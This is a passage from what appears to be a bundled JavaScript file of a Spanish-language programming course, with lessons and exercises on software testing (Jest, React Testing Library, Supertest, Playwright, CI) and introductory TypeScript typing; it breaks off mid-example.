*   Describe cmo estructuraras los Tailwind Presets para un sistema de micro-frontends de una empresa con 3 marcas diferentes que comparten la misma base de diseo pero usan colores y fuentes distintas.

## 2. Diagnstico de Performance
*   Un desarrollador reporta que el archivo CSS generado pesa 4MB. Qu buscaras en la configuracin o en el cdigo para reducir este tamao sin perder funcionalidades?

## 3. Desafo Real: Migracin Segura
*   Cmo introduciras Tailwind en un proyecto que ya usa **SASS con CSS Modules** sin romper la interfaz actual? Disea un plan de 3 pasos.

## 4. Criterios de Aprobacin
* [ ] Justificacin tcnica slida basada en tradeoffs.
* [ ] Enfoque en escalabilidad (manejo de presets, plugins, capas).
* [ ] Conocimiento de las herramientas de optimizacin (Purge, JIT).
`,completed:!1,isProject:!0}]},hD={id:"testing",title:"Testing y Calidad de Software",description:"Aprende a escribir cdigo confiable, desde pruebas unitarias hasta estrategias de despliegue continuo.",completed:!1,lessons:[{id:"testing-01-intro-testing",title:"Introduccin al Testing - El Robot que revisa tu cdigo",level:"junior",content:`# Leccin 01: Introduccin al Testing - El Robot que revisa tu cdigo

Alguna vez te pas que arreglaste un error en tu cdigo y, sin querer, rompiste algo que ya funcionaba bien? El testing est aqu para que eso no te pase nunca ms.

## 1. Qu es el Testing?
Imagina que construiste un juguete. Antes de regalrselo a un nio, lo sacudes para ver si se le caen las piezas. Eso es testear. En programacin, escribimos cdigo para probar nuestro cdigo.

## 2. Testing Manual vs Automtico
*   **Manual:** T abres la web, haces clic y rezas para que funcione. Es lento y te puedes olvidar de cosas.
*   **Automtico:** Un robot (un programa) lo hace por ti en segundos. Lo puede hacer mil veces al da y nunca se cansa ni se olvida de nada.

## 3. Por qu importa (Incluso siendo Junior)
1. **Confianza:** Si los tests estn en verde, puedes estar tranquilo.
2. **Documentacin:** Un test te dice qu se supone que tiene que hacer una funcin.
3. **Calidad:** Te obliga a pensar mejor cmo escribir tu cdigo.

---

### Concepto Junior:
El testing no es "perder tiempo", es **ahorrar tiempo** a futuro. Es mejor detectar un error ahora en tu computadora que maana cuando el cliente lo vea.
`,completed:!1},{id:"testing-02-tipos-de-testing",title:"Tipos de Pruebas (La Pirmide)",level:"junior",content:`# Leccin 02: Tipos de Pruebas (La Pirmide)

No todos los tests prueban lo mismo. Segn cuntas piezas estemos revisando, les ponemos un nombre diferente.

## 1. Unit Testing (Pruebas Unitarias)
Son como probar cada ladrillo de una casa. Prueban una sola funcin o pedacito de cdigo solo.
*   **Ejemplo:** Probar que la funcin \`sumar(2, 2)\` devuelva \`4\`.
*   **Velocidad:** Muy rpidas.

## 2. Integration Testing (Pruebas de Integracin)
Son como probar que los ladrillos encajen bien entre s para formar una pared. Prueban cmo interactan dos partes.
*   **Ejemplo:** Probar que cuando guardas un usuario, se guarde bien en la base de datos.

## 3. E2E Testing (Pruebas de punta a punta)
Son como entrar a la casa terminada y probar si el timbre suena. Prueban el sistema completo como lo vera el usuario.
*   **Ejemplo:** Un robot entra a tu web, se loguea y compra un producto.

---

### La Regla de Oro:
Debes tener **muchos** unit tests, **algunos** de integracin y **poquitos** E2E. A esto se le llama la **Pirmide de Testing**.
`,completed:!1},{id:"testing-03-herramientas-y-primer-test",title:"Tu primer test con Jest / Vitest",level:"junior",content:`# Leccin 03: Tu primer test con Jest / Vitest

Vamos a ver cmo se escribe un test real en el lenguaje que usamos todos los das: JavaScript.

## 1. Herramientas: Jest y Vitest
Son los programas que corren nuestros tests. Se usan en casi todas las empresas del mundo y se escriben muy parecido.

## 2. Conceptos: Expect y Assert
En un test siempre decimos: "Espero que esto sea igual a aquello".
*   **Expect:** Es la palabra que usamos para decir "Mir este resultado".
*   **Assert:** Es lo que afirmamos que debe pasar.

## 3. Ejemplo Real
Imagina una funcin en \`calculo.js\`:
\`\`\`javascript
export function duplicar(n) { return n * 2; }
\`\`\`

Tu test en \`calculo.test.js\`:
\`\`\`javascript
import { duplicar } from './calculo';

test('debe duplicar el numero 5', () => {
    // 1. Ejecuto (obtengo el resultado)
    const resultado = duplicar(5);
    
    // 2. Espero (afirmo lo que quiero)
    expect(resultado).toBe(10);
});
\`\`\`

### Cmo se lee esto?
\`test('descripcin', () => { expect(resultado).toBe(valor_esperado); });\`

---

### Misin Junior:
Fjate que \`toBe(10)\` es donde decimos qu esperamos. Si maana cambias la funcin y devuelve 11, el test se pondr rojo y te avisar que algo sali mal. Es tu red de seguridad!
`,completed:!1},{id:"testing-04-unit-testing-profundo",title:"Unit Testing Profundo y Mocking",level:"semi-senior",content:`# Leccin 04: Unit Testing Profundo y Mocking

Como Semi-Senior, ya no solo testeas funciones matemticas simples. Debes enfrentar dependencias externas, efectos secundarios y lgica compleja. Aqu el **Mocking** es tu mejor amigo.

## 1. Mocks vs Spies
*   **Mocks (\`jest.fn()\`):** Reemplazan una funcin real con una versin "de mentira" que puedes controlar.
*   **Spies (\`jest.spyOn()\`):** Observan una funcin real sin reemplazarla por completo, permitindote saber cuntas veces se llam y con qu argumentos.

## 2. El Arte del Mocking de Mdulos
Imagina un servicio que enva un Email. No queremos enviar un email real en cada test.
\`\`\`javascript
import { sendEmail } from './emailService';
import { processOrder } from './orderProcessor';

jest.mock('./emailService'); // El mdulo ahora es un Mock

test('debe enviar un email cuando la orden se procesa', async () => {
    await processOrder({ id: 1 });
    expect(sendEmail).toHaveBeenCalledTimes(1);
});
\`\`\`

## 3. Coverage (Cobertura de Cdigo)
La cobertura te dice qu porcentaje de tu cdigo est siendo ejecutado por los tests.
*   **Statement Coverage:** Pasamos por todas las lneas?
*   **Branch Coverage:** Probamos tanto el \`if\` como el \`else\`?
**Ojo:** Un 100% de coverage no significa que tu app no tenga bugs, solo significa que los tests pasaron por todas las lneas.

---

### Buenas Prcticas de Organizacin:
1.  **Describe/It:** Agrupa por contexto.
2.  **Setup/Teardown:** Usa \`beforeEach\` para resetear estados y \`afterAll\` para cerrar conexiones.
3.  **Independencia:** Un test NO debe depender del resultado de otro.
`,completed:!1},{id:"testing-05-react-testing",title:"Testing de Componentes y Hooks en React",level:"semi-senior",content:`# Leccin 05: Testing de Componentes y Hooks en React

En el frontend moderno, el testing se basa en el comportamiento del usuario. Usamos **React Testing Library (RTL)** como estndar.

## 1. Testing de Componentes (RTL)
En lugar de testear variables internas, testeamos lo que el usuario ve.
\`\`\`javascript
import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';

test('el formulario de registro muestra error con email invlido', async () => {
  render(<RegistrationForm />);
  const emailInput = screen.getByLabelText(/email/i);
  const submitBtn = screen.getByRole('button', { name: /enviar/i });

  await userEvent.type(emailInput, 'correo-invalido');
  await userEvent.click(submitBtn);

  expect(screen.getByText(/formato de email incorrecto/i)).toBeInTheDocument();
});
\`\`\`

## 2. Testing de Hooks Personalizados
Los hooks no se pueden testear como funciones normales porque necesitan el ciclo de vida de React. Para eso usamos \`renderHook\` de \`@testing-library/react\`.
\`\`\`javascript
import { renderHook, act } from '@testing-library/react';
import { useCounter } from './useCounter';

test('debe incrementar el contador', () => {
  const { result } = renderHook(() => useCounter());
  
  act(() => {
    result.current.increment();
  });

  expect(result.current.count).toBe(1);
});
\`\`\`

## 3. Mock Service Worker (MSW)
Para testear componentes que llaman a APIs, lo mejor es **MSW**. Simula peticiones de red a nivel de navegador, permitiendo que tu cdigo use \`fetch\` real pero reciba respuestas mockeadas.

---

### Regla Semi-Senior:
Si para encontrar un elemento en tu test usas \`container.querySelector('.btn-blue')\`, ests fallando. Usa \`screen.getByRole\` u otros mtodos basados en accesibilidad.
`,completed:!1},{id:"testing-06-api-testing",title:"Testing de APIs con Supertest",level:"semi-senior",content:`# Leccin 06: Testing de APIs con Supertest

En el backend, el Unit Test no es suficiente. Necesitamos verificar que nuestros Endpoints (rutas) respondan correctamente a peticiones HTTP.

## 1. Qu es Supertest?
Es una librera que permite lanzar peticiones HTTP (GET, POST, etc.) a tu aplicacin Express/Node sin necesidad de levantar el servidor realmente en un puerto.

## 2. Ejemplo de integration test de una API
\`\`\`javascript
import request from 'supertest';
import app from '../app';

describe('POST /api/login', () => {
    test('debe devolver 200 y un token con credenciales vlidas', async () => {
        const response = await request(app)
            .post('/api/login')
            .send({
                email: 'test@user.com',
                password: 'password123'
            });

        expect(response.status).toBe(200);
        expect(response.body).toHaveProperty('token');
    });

    test('debe devolver 401 con contrasea incorrecta', async () => {
        const response = await request(app)
            .post('/api/login')
            .send({ email: 'test@user.com', password: 'wrong' });

        expect(response.status).toBe(401);
    });
});
\`\`\`

## 3. Manejo de Bases de Datos en Tests
Como Semi-Senior, debes asegurar que los tests sean **deterministas**.
*   Usa una base de datos de pruebas separada (ej: SQLite in-memory o una instancia de PostgreSQL limpia).
*   Usa "Seeds" para cargar datos necesarios antes de los tests.
*   Limpia las tablas despus de cada suite de tests.

---

### Misin Semi-Senior:
Asegurar que cada endpoint crtico tenga al menos un test de "Camino Feliz" (200 OK) y un test de "Error Esperado" (400 Bad Request o 401 Unauthorized).
`,completed:!1},{id:"testing-07-e2e-y-estrategia",title:"E2E Testing y Estrategia Senior",level:"senior",content:`# Leccin 07: E2E Testing y Estrategia Senior

En el nivel Senior, el foco cambia. Ya no se trata de "cmo escribir el test", sino de **qu testear** y cmo asegurar la calidad en sistemas complejos.

## 1. End-to-End (E2E) con Playwright
Playwright es la herramienta moderna favorita. Permite automatizar flujos completos en navegadores reales.
*   **Visin Senior:** Los tests E2E son caros de mantener. Solo deben cubrir los flujos de negocio vitales (ej: "Aadir al carrito y pagar").

## 2. La Pirmide de Testing (Revisitada)
Un Senior decide la inversin:
*   **Unit Tests (70%):** Rpidos, prueban lgica de negocio pura.
*   **Integration Tests (20%):** Prueban contratos entre frontend/backend o servicios.
*   **E2E Tests (10%):** Verifican que el sistema entero est vivo.

## 3. Qu NO testear?
*   Cdigo de terceros (Librerias externas).
*   Detalles de implementacin que cambian frecuentemente.
*   UI puramente esttica que no afecta la funcionalidad.

## 4. Testing en Microservicios
En un mundo distribuido, el Unit Test falla si el servicio vecino cambia.
*   **Contract Testing (Pact):** Se basa en definir un acuerdo (contrato) entre el proveedor (API) y el consumidor (Frontend/Otro servicio). Si el proveedor rompe el contrato, los tests fallan antes del despliegue.

---

### Caso de Liderazgo Senior:
Si el equipo est retrasado, un Senior no corta los tests. Prioriza: "Hagamos solo los Unit Tests de la lgica central y el E2E del flujo de pago. El resto puede esperar a la siguiente iteracin".
`,completed:!1},{id:"testing-08-ci-y-escala",title:"Testing en Pipelines CI y Escala",level:"senior",content:`# Leccin 08: Testing en Pipelines CI y Escala

La calidad de software a escala organizacional requiere automatizacin total. El testing es un proceso continuo, no una tarea final.

## 1. Testing en la Pipeline (CI/CD)
Tus tests deben correr automticamente en cada \`Pull Request\`.
*   **Checkgates:** Si los tests no pasan (o el coverage baja de cierto porcentaje), el botn de "Merge" queda bloqueado.
*   **Paralelizacin:** En proyectos grandes, correr 5,000 tests toma mucho tiempo. Un Senior configura la CI para correr tests en paralelo usando mltiples mquinas.

## 2. Estrategias de Testing a Gran Escala
*   **Smoke Testing:** Un conjunto mnimo de tests que corren justo despus de un despliegue en produccin para verificar que "no sale humo" (lo bsico funciona).
*   **Chaos Engineering:** Introducir fallos a propsito en produccin para ver si el sistema es resiliente.
*   **Visual Regression Testing:** Herramientas que comparan capturas de pantalla para detectar cambios inesperados en el diseo.

## 3. El Rol del Senior en la Calidad
Un Senior entrena al equipo para que el testing sea parte de la cultura. No es un "extra", es parte de la definicin de hecho (Definition of Done).

---

### Misin Final Senior:
Disear una estrategia de testing que permita hacer despliegues diarios a produccin con total confianza, minimizando los "hotfixes" de emergencia.

### Desafo Senior:
Si tienes un test que a veces pasa y a veces falla sin razn aparente (Flaky Test), cul es tu accin inmediata? (Pista: Un test inestable es peor que no tener tests).
`,completed:!1},{id:"testing-09-practica-testing",title:"Ejercicios de Testing: Prctica por Niveles",level:"senior",content:`# Ejercicios de Testing: Prctica por Niveles

Aplica lo aprendido para asegurar la calidad de tus proyectos.

---

## Nivel Junior: El Comprobador de Edad
**Consigna:** Tienes una funcin \`esMayorDeEdad(edad)\` que devuelve \`true\` si la edad es 18 o ms, y \`false\` si es menos.
1. Escribe el test para un usuario de **17 aos**.
2. Escribe el test para un usuario de **18 aos**.
3. Escribe el test para un usuario de **100 aos**.

---

## Nivel Semi-Senior: Mocking de Servicios
**Consigna:** Tienes una funcin \`enviarNotificacin(usuarioId)\` que llama a un servicio externo de emails.
1. Crea un **Mock** para el servicio de emails.
2. Escribe el test que verifique que el servicio de email sea llamado **exactamente una vez** cuando ejecutas la funcin.

---

## Nivel Senior: Estrategia de Planificacin
**Consigna:** Se lanza un nuevo sistema de pagos crticos para una aerolnea.
1. Define qu porcentaje del presupuesto y tiempo asignaras a Unit Tests vs E2E.
2. Cmo manejaras el testeo de la integracin con el procesador de tarjetas real (Stripe/PayPal) sin gastar dinero real en los tests?
3. Qu haras si un test E2E falla "a veces" sin razn clara?

---

### Criterio de Resolucin:
No busques solo que el test "pase". Busca que el test sea legible y que realmente proteja al usuario final. 
`,completed:!1,isProject:!0},{id:"testing-evaluacion-testing",title:"Testing y Calidad",level:"junior",content:`# Evaluacin Final: Testing y Calidad

Demuestra tu nivel respondiendo estos desafos de ingeniera de software.

---

## 1. Fundamentos (Junior)
*   Diferencia entre **Testing Manual** y **Automtico**. Cundo usaras cada uno?
*   Qu es un **Assert** en una prueba unitaria?

## 2. Implementacin (Semi-Senior)
*   Cul es la diferencia entre un **Mock** y un **Spy**? Da un ejemplo de uso de cada uno.
*   En el contexto de React, por qu preferimos testear "lo que el usuario ve" en lugar del "estado interno" del componente?

## 3. Estrategia (Senior)
*   Qu es el **Contract Testing** y por qu es vital en una arquitectura de microservicios?
*   Si tu equipo tiene un 100% de Line Coverage pero siguen apareciendo errores de lgica, qu otras mtricas o tcnicas propondras?
*   Define el concepto de **Flaky Tests** y propone una estrategia para eliminarlos del CI/CD.

---

### Recordatorio:
Un buen ingeniero no testea todo. Testea lo que importa para el usuario y el negocio. 
`,completed:!1,isProject:!0}]},I1={id:"ts-module",title:"TypeScript",description:"De JavaScript a TypeScript: Tipado esttico y robustez para tus aplicaciones.",completed:!1,lessons:[{id:"ts-junior-prerrequisitos",title:"Conocimientos Previos Necesarios",level:"junior",content:'# Conocimientos Previos: Ests listo para TypeScript?\n\nAntes de sumergirte en el mundo del tipado esttico, asegrate de tener una base slida en los siguientes temas. TypeScript no reemplaza a JavaScript, lo **mejora**. Si no entiendes cmo funciona el motor, no entenders por qu los tipos son necesarios.\n\n## 1. Fundamentos de JavaScript (ES6+)\nDebes sentirte cmodo con la sintaxis moderna de JS:\n*   **Declaracin de variables:** `let` vs `const`.\n*   **Arrow Functions:** `() => { ... }`.\n*   **Destructuring:** Extraer propiedades de objetos y arrays.\n*   **Template Literals:** El uso de backticks y `${variable}`.\n*   **Asincrona:** `Promises`, `async/await`.\n\n## 2. Tipos de Datos Dinmicos\nDebes conocer los tipos de datos bsicos que JS ya maneja por debajo:\n*   Primitive: `string`, `number`, `boolean`, `null`, `undefined`, `symbol`.\n*   Reference: `Objects`, `Arrays`, `Functions`.\n\n## 3. Entorno de Desarrollo\n*   **Terminal/Consola:** Saber navegar carpetas y ejecutar comandos bsicos (`cd`, `ls`, `npm`).\n*   **Node.js y NPM:** Tener instalado Node y saber cmo inicializar un proyecto (`npm init`).\n\n## 4. El "Mindset" de Programacin\nTypeScript te obliga a pensar en la **forma** de los datos antes de escribir la lgica. Si vienes de JS, al principio sentirs que "peleas" con el compilador. Eso es normal. No es un error, es un **seguro de vida** para tu cdigo.\n\n---\nSi te falta alguno de estos puntos, te recomendamos pasar primero por el mdulo de **JavaScript Moderno** de nuestra plataforma.\n',completed:!1},{id:"ts-junior-que-es-ts",title:"Qu es TypeScript y por qu usarlo?",level:"junior",content:`# Leccin 1: Qu es TypeScript y por qu usarlo?

## 1. El Problema de JavaScript

JavaScript es un lenguaje **dinmicamente tipado**. Esto significa que puedes asignar cualquier valor a cualquier variable, en cualquier momento.

\`\`\`javascript
// JavaScript
let numero = 5;
numero = "cinco"; // JS: "Sin problemas "
numero.toFixed(2); // JS Runtime Error: numero.toFixed is not a function 
\`\`\`

En proyectos grandes, esto es un caos. No sabes qu tipo de dato es \`numero\`, y descubres el error **cuando el usuario est usando la app**.

## 2. La Solucin: TypeScript (TS)

TypeScript es un **Superset** de JavaScript creado por Microsoft.
*   **Superset:** Todo cdigo JS es cdigo valid en TS.
*   **Tipado Esttico:** TS te obliga a definir qu tipo de dato es cada cosa **mientras escribes el cdigo**.

\`\`\`typescript
// TypeScript
let numero: number = 5;
numero = "cinco"; // Error de TypeScript: Type 'string' is not assignable to type 'number'.
\`\`\`

**El error salta en tu editor (VS Code), NO en el navegador del usuario.**

## 3. Cmo funciona?

El navegador **NO entiende TypeScript**. Solo entiende JavaScript.
Por eso, TS necesita un proceso de **Transpilacin** (Compilacin):

\`Cdigo TS (.ts)\` -> **Compilador (tsc)** -> \`Cdigo JS (.js)\` -> **Navegador**

Si tu cdigo TS tiene errores, la compilacin falla y no generas el JS roto. Es tu primera lnea de defensa.

## 4. Ventajas

1.  **Autocompletado Brutal:** Como TS sabe qu hay en tus objetos, el editor te sugiere propiedades reales.
2.  **Menos Bugs:** Atrapas errores de tipo ("undefined is not a function") antes de ejecutar.
3.  **Documentacin Viva:** Leer la firma de una funcin (\`function sumar(a: number, b: number): number\`) te dice exactamente qu hace, sin leer el cdigo de adentro.

## 5. Ejercicio Mental
Imagina que recibes un objeto \`usuario\` de una API.
En JS: \`console.log(usuario.nombree)\` -> \`undefined\` (y sigues programando feliz).
En TS: \`console.log(usuario.nombree)\` -> **Error Rojo**: "Property 'nombree' does not exist on type 'User'. Did you mean 'nombre'?".

Cul prefieres?
`,completed:!1},{id:"ts-junior-tipos-primitivos",title:"Tipos Primitivos",level:"junior",content:`# Leccin 2: Tipos Primitivos

## 1. Los bloques bsicos

En TypeScript, usamos los mismos tipos de datos que en JavaScript, pero ahora los hacemos explcitos.

Los 3 principales son:

### \`string\` (Texto)
Cualquier cosa entre comillas (simples, dobles o backticks).

\`\`\`typescript
let nombre: string = "Octavio";
let saludo: string = \`Hola \${nombre}\`;
let inicial: string = 'O'; 
\`\`\`

### \`number\` (Nmeros)
Enteros, decimales, negativos... en JS/TS todo es \`number\` (punto flotante).

\`\`\`typescript
let edad: number = 25;
let temperatura: number = -10.5;
let precio: number = 1000;
\`\`\`

### \`boolean\` (Verdadero/Falso)
Solo dos valores posibles. Vitales para lgica.

\`\`\`typescript
let esAdmin: boolean = true;
let estaCargando: boolean = false;
\`\`\`

## 2. Tipos Especiales (Intro)

### \`any\` (El Comodn / El Enemigo)
Desactiva el chequeo de tipos. Es como volver a JavaScript.
**salo solo si es estrictamente necesario (migrar cdigo viejo).**

\`\`\`typescript
let variableLoca: any = 5;
variableLoca = "texto"; // TS no se queja
variableLoca.metodoInexistente(); // TS no se queja (pero explotar al ejecutar)
\`\`\`

### \`void\`
Veremos esto en funciones. Significa "vaco" o "sin valor de retorno".

### \`null\` y \`undefined\`
Son tipos por s mismos.

## 3. Error Comn: Tipos vs Valores

Cuidado:
*   \`String\` (Con mayscula) es el objeto wrapper de JS. **NO LO USES**.
*   \`string\` (Con minscula) es el tipo primitivo de TS. **USA ESTE**.

\`\`\`typescript
// MAL
let nombre: String = "Juan";

// BIEN
let nombre: string = "Juan";
\`\`\`

## 4. Ejercicio
Crea un archivo \`.ts\` y declara variables para:
1.  Nombre de tu pelcula favorita (\`string\`).
2.  Ao de estreno (\`number\`).
3.  Est en Netflix? (\`boolean\`).
Intenta asignarles valores incorrectos y mira cmo tu editor grita en rojo.
`,completed:!1},{id:"ts-junior-tipado-variables",title:"Tipado de Variables e Inferencia",level:"junior",content:`# Leccin 3: Tipado de Variables e Inferencia

## 1. Anotacin de Tipos (Type Annotation)

Es cuando le dices explcitamente a TS qu tipo es la variable usando \`: tipo\` despus del nombre.

\`\`\`typescript
let username: string = "pepe123";
const maxIntentos: number = 5;
\`\`\`

## 2. Inferencia de Tipos (Type Inference)

**Magia!** 
TypeScript es inteligente. Si inicializas una variable con un valor, TS **adivina** (infiere) el tipo y lo fija para siempre.

\`\`\`typescript
let tech = "React"; 
// TS dice: "Ah, le has puesto un string. Entonces 'tech' es de tipo string".

tech = 100; 
// Error: Type 'number' is not assignable to type 'string'.
\`\`\`

**Buena Prctica:** Si la inferencia funciona, NO escribas el tipo. Hace el cdigo ms limpio.

\`\`\`typescript
// Redundante (Ruido visual)
let puntos: number = 0;

// Correcto (Limpio)
let puntos = 0; 
\`\`\`

## 3. Cundo S anotar tipos?

1.  **Cuando declaras sin inicializar:**
    \`\`\`typescript
    let usuario; // TS infiere 'any' 
    usuario = "Ana";
    \`\`\`
    Correcto:
    \`\`\`typescript
    let usuario: string; // Le prometo a TS que aqu habr un string luego
    usuario = "Ana";
    \`\`\`

2.  **Cuando el tipo inferido no es el que quieres (ej: Union Types, ver ms adelante).**

## 4. Constantes (\`const\`) y Literal Types

Cuando usas \`const\`, la inferencia es ms estricta.

\`\`\`typescript
let a = "Hola";  // Tipo: string (puede cambiar a otro texto)
const b = "Hola"; // Tipo: "Hola" (Literal Type)
\`\`\`
La variable \`b\` no es solo un string, es ESE string especfico. No puede ser "Chau".

## 5. Ejercicio
Declara una variable \`mensaje\` sin asignarle valor inicial.
Luego asgnale \`"Cargando..."\`.
Luego intenta asignarle \`false\`.
Para arreglarlo, qu debiste hacer al declararla?
`,completed:!1},{id:"ts-junior-funciones-tipadas",title:"Funciones Tipadas",level:"junior",content:`# Leccin 4: Funciones Tipadas

## 1. El contrato de la funcin

En las funciones es donde TS brilla ms. Defines:
1.  Qu entra (Argumentos).
2.  Qu sale (Retorno).

\`\`\`typescript
function sumar(a: number, b: number): number {
    return a + b;
}
\`\`\`
Aqu decimos: "Dame dos nmeros y te prometo devolverte un nmero".

## 2. Parmetros

Si no tipas los parmetros, TS (en modo estricto) te dar error de \`implicit any\`. **Siempre tipa los parmetros.**

\`\`\`typescript
// Error: Parameter 'nombre' implicitly has an 'any' type.
function saludar(nombre) { 
    return "Hola " + nombre;
}
\`\`\`

### Parmetros Opcionales (\`?\`)
Usa \`?\` al final del nombre del parmetro.

\`\`\`typescript
function saludar(nombre: string, apellido?: string) {
    if (apellido) {
        return \`Hola \${nombre} \${apellido}\`;
    }
    return \`Hola \${nombre}\`;
}

saludar("Ana"); // Vlido
saludar("Ana", "Prez"); // Vlido
\`\`\`
*Nota: Los opcionales siempre van al final.*

### Parmetros por Default
Igual que en JS moderno, infieren el tipo automticamente.

\`\`\`typescript
function saludar(nombre: string, momento: string = "da") {
    return \`Buen \${momento}, \${nombre}\`;
}
\`\`\`

## 3. Retorno (\`void\`)

Si una funcin no devuelve nada (solo hace \`console.log\` o modifica el DOM), su tipo de retorno es \`void\`.

\`\`\`typescript
function logData(mensaje: string): void {
    console.log("LOG:", mensaje);
    // No hay return
}
\`\`\`

## 4. Ejercicio
Escribe una funcin \`calcularPrecio\` que reciba:
1.  \`precio\` (number).
2.  \`impuesto\` (number, opcional).

Si recibe impuesto, devuelve \`precio + impuesto\`.
Si no, devuelve \`precio\` (asume impuesto 0).
**Tipa explcitamente el retorno.**
`,completed:!1},{id:"ts-junior-objetos-tipados",title:"Objetos Tipados",level:"junior",content:`# Leccin 5: Objetos Tipados

## 1. La forma del objeto

En JS, los objetos son bolsas dinmicas de propiedades. En TS, tienen una "forma" (shape) definida.

Puedes tipar un objeto "inline":

\`\`\`typescript
let usuario: { nombre: string; edad: number; activo: boolean } = {
    nombre: "Carlos",
    edad: 30,
    activo: true
};
\`\`\`

Si intentas aadir una propiedad extra, TS explota:

\`\`\`typescript
usuario.apellido = "Lpez"; 
// Error: Property 'apellido' does not exist on type '{ nombre: string; ... }'.
\`\`\`

## 2. Propiedades Opcionales

Igual que en funciones, usa \`?\` si una propiedad puede no existir.

\`\`\`typescript
let producto: { id: number; nombre: string; descuento?: number } = {
    id: 1,
    nombre: "Teclado"
};
// 'descuento' no est, y es vlido.
\`\`\`

## 3. Por qu esto es engorroso?

Escribir \`{ tipo... }\` cada vez es repetitivo e ilegible.
Para eso existen los **Type Aliases** e **Interfaces** (veremos en prximas lecciones). Por ahora, entiende que TS valida estricta estructura.

## 4. Ejercicio "El Perfil"
Crea un objeto \`miPerfil\` que tenga:
*   \`username\` (string)
*   \`email\` (string)
*   \`edad\` (number)
*   \`esPremium\` (boolean, opcional)

Intenta acceder a \`miPerfil.password\`. Observa el error.
`,completed:!1},{id:"ts-junior-arrays-tuplas",title:"Arrays y Tuplas",level:"junior",content:`# Leccin 6: Arrays y Tuplas

## 1. Arrays Tipados

Un array en TS suele contener elementos de **un mismo tipo**.

Sintaxis: \`Tipo[]\` o \`Array<Tipo>\`.

\`\`\`typescript
let notas: number[] = [10, 8, 9, 5];
let nombres: string[] = ["Ana", "Beto"];

notas.push(7); // OK
notas.push("siete"); // Error: no puedes meter un string en number[]
\`\`\`

## 2. Arrays Mixtos (Cuidado)

Si quieres mezclar, TS infiere una Unin (ver leccin sgte) o debes usar \`any\` (no recomendado).

\`\`\`typescript
let mixto = [1, "Hola", true]; // (string | number | boolean)[]
\`\`\`

## 3. Tuplas (Tuples)

Esto es un concepto nuevo de TS.
Una Tupla es un array de **longitud fija** y **tipos definidos en posiciones especficas**.

Ejemplo: Coordenadas GPS (Latitud, Longitud).

\`\`\`typescript
// Quiero: [numero, numero]
let coords: [number, number] = [40.7128, -74.0060];

// Ejemplo: [string, number] -> [Nombre, Edad]
let usuarioTupla: [string, number] = ["Juan", 25];

usuarioTupla[0] = 30; // Error: La posicin 0 DEBE ser string.
\`\`\`

Las tuplas son muy tiles para funciones que devuelven mltiples valores (como los Hooks de React: \`useState\`).

## 4. Ejercicio
Declara:
1.  Un array de tus hobbies (strings).
2.  Una tupla que represente una fecha: \`[dia, mes, ao]\` (tres nmeros).
Intenta hacer \`push\` de un booleano al array de hobbies.
`,completed:!1},{id:"ts-junior-union-types",title:"Union Types (Tipos Unin)",level:"junior",content:`# Leccin 7: Union Types (Tipos Unin)

## 1. Flexibilidad Controlada

A veces una variable puede ser de ms de un tipo.
Por ejemplo, un ID puede ser \`number\` (123) o \`string\` ("abc-123").

Usamos el operador \`|\` (pipe) para decir "O".

\`\`\`typescript
let id: number | string;

id = 10; // Valido
id = "A-20"; // Valido
id = true; // Error
\`\`\`

## 2. Narrowing (Estrechamiento)

El problema de las uniones: TS solo te deja usar mtodos comunes a TODOS los tipos de la unin.

\`\`\`typescript
function imprimirId(id: number | string) {
    // console.log(id.toUpperCase()); 
    // Error: toUpperCase no existe en 'number'.
    
    if (typeof id === 'string') {
        // Dentro de este if, TS SABE que id es string.
        console.log("ID String:", id.toUpperCase()); // OK
    } else {
        // Aqu TS sabe que es number.
        console.log("ID Numero:", id.toFixed(2)); // OK
    }
}
\`\`\`

Esto se llama **Type Guard**. Usamos \`typeof\` para discriminar el tipo y que TS nos deje trabajar seguros.

## 3. Arrays con Uniones

Para arrays mixtos controlados:

\`\`\`typescript
let lista: (string | number)[] = [1, "dos", 3, "cuatro"];
\`\`\`

## 4. Ejercicio
Crea una funcin \`padLeft\` que reciba:
*   \`value\`: string
*   \`padding\`: number | string

Si \`padding\` es un nmero, aade esa cantidad de espacios a la izquierda de \`value\`.
Si \`padding\` es un string, adelo directamente a la izquierda de \`value\`.
Usa \`typeof\` para distinguir los casos.
`,completed:!1},{id:"ts-junior-type-aliases",title:"Type Aliases (Alias de Tipos)",level:"junior",content:`# Leccin 8: Type Aliases (Alias de Tipos)

## 1. Ponle nombre a tus tipos

Hasta ahora definamos tipos "sueltos".
Con \`type\`, podemos crear nuestros propios nombres para tipos complejos y reutilizarlos.

\`\`\`typescript
// Definimos el Alias
type ID = string | number;

// Lo usamos
let usuarioId: ID = 123;
let productoId: ID = "prod-1";
\`\`\`

## 2. Tipando Objetos con \`type\`

Aqu es donde se pone bueno. En lugar de escribir la estructura \`{...}\` siempre, creamos un molde.

\`\`\`typescript
type Usuario = {
    id: ID; // Reusamos el type anterior
    nombre: string;
    email: string;
    activo: boolean;
};

// Creamos objetos que cumplen el molde
const pepe: Usuario = {
    id: 1,
    nombre: "Pepe",
    email: "pepe@mail.com",
    activo: true
};

function registrar(u: Usuario) {
    // ...
}
\`\`\`

## 3. Literal Types + Union Types

Puedes crear tipos muy especficos.

\`\`\`typescript
type Talla = 'S' | 'M' | 'L' | 'XL';

let miCamiseta: Talla = 'M';
miCamiseta = 'XXL'; // Error: Type '"XXL"' is not assignable to type 'Talla'.
\`\`\`

Esto es sper poderoso para estados o configuraciones fijas.

## 4. Ejercicio
Define un type \`Heroe\` con:
*   \`nombre\`: string
*   \`poder\`: string
*   \`vida\`: number (0 a 100)

Define un type \`Estado\` que solo pueda ser: \`'vivo'\`, \`'muerto'\`, o \`'zombie'\`.

Crea una variable \`batman\` de tipo \`Heroe\` y una variable \`estadoActual\` de tipo \`Estado\`.
`,completed:!1},{id:"ts-junior-interfaces-basicas",title:"Interfaces Bsicas",level:"junior",content:`# Leccin 9: Interfaces Bsicas

## 1. Qu es una Interface?

Es muy similar a un \`type\` de objeto, pero pensado especficamente para definir **contratos de objetos**.
Es la forma ms comn en TS de definir modelos de datos.

\`\`\`typescript
interface Producto {
    id: number;
    nombre: string;
    precio: number;
}

const tableta: Producto = {
    id: 1,
    nombre: "iPad",
    precio: 500
};
\`\`\`

## 2. Diferencia Clave: Extensibilidad

Las interfaces pueden **extenderse** (heredar) unas de otras. Esto es genial para construir modelos escalables.

\`\`\`typescript
interface Animal {
    nombre: string;
}

// Perro tiene 'nombre' (porque hereda) Y 'ladrar'
interface Perro extends Animal {
    ladrar(): void;
}

const firulais: Perro = {
    nombre: "Firulais",
    ladrar: () => console.log("Guau!")
